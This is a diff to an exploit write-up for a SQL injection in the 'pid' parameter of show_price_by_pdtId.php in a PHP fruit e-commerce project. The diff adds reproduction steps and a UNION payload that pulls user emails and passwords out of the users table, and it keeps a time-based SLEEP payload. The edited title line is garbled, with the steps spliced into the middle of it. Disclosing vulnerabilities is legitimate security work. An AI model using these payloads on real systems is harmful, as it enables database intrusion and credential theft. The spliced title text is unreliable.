@@ -1,4 +1,12 @@
-# Exploit Title: Ecommerce-project-with-php-and-mysqli-Fruits-Bazar- – SQL Injection in show_price_by_pdtId.php (`http://localhost/ecommercefruitsbazarmaster/admin/json/show_price_by_pdtId.php?pid=1`)
+# Exploit Title: Ecommerce-project-with-php-and-mysqli-Fruits-Ba## Steps to Reproduce
+
+1. Browse to `http://localhost:8000/admin/json/show_price_by_pdtId.php?pid=1`.  
+2. Intercept the request and inject the following payload into the `pid` parameter:
+    ```
+    http://localhost:8000/admin/json/show_price_by_pdtId.php?pid=-1 union select 1,2,concat(user_email,'::',user_password),4,5,6,7,8,9 from users-- -
+    ```
+3. Observe the extracted user email and password displayed in the application (see screenshot above).
+4. Confirm DBMS fingerprinting and data extraction as permitted by the app's DB privileges. SQL Injection in show_price_by_pdtId.php (`http://localhost/ecommercefruitsbazarmaster/admin/json/show_price_by_pdtId.php?pid=1`)
 
 **Date:** 2025-08-11  
 **Exploit Author:** Anonymous  
@@ -20,7 +28,7 @@ A SQL Injection vulnerability exists in the `show_price_by_pdtId.php` endpoint o
 
 ### Affected Endpoint
 
-- **URL:** `http://localhost/ecommercefruitsbazarmaster/admin/json/show_price_by_pdtId.php?pid=1`
+- **URL:** `http://localhost:8000/admin/json/show_price_by_pdtId.php?pid=1`
 - **HTTP Method:** GET
 - **Vulnerable File:** `show_price_by_pdtId.php`
 - **Parameter:** `pid`
@@ -33,18 +41,18 @@ A SQL Injection vulnerability exists in the `show_price_by_pdtId.php` endpoint o
 - **Type:** time-based blind
   - **Title:** MySQL >= 5.0.12 AND time-based blind (query SLEEP)
   - **Payload:** `pid=1 AND (SELECT 1551 FROM (SELECT(SLEEP(5)))fsYw)`
-- **Type:** UNION query
-  - **Title:** Generic UNION query (NULL) - 9 columns
-  - **Payload:** 
-```
-pid=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7176767671,0x45706268466766416c57656b536342676557474662727058564c6541755675444975646362756642,0x717a626b71),NULL,NULL,NULL,NULL,NULL,NULL-- -
-```
+- **Type:** UNION query (data exfiltration)
+  - **Title:** UNION query to extract user credentials - 9 columns
+  - **Payload:**  
+    ```
+    http://localhost:8000/admin/json/show_price_by_pdtId.php?pid=-1 union select 1,2,concat(user_email,'::',user_password),4,5,6,7,8,9 from users-- -
+    ```
 
 
 
-## Proof of Concept (Burp Repeater)
+## Proof of Concept (Firefox Screenshot)
 
-![burp-repeater-poc](poc.png)
+![exploit](exploit.png)
 
 ## SQLMap Summary
 
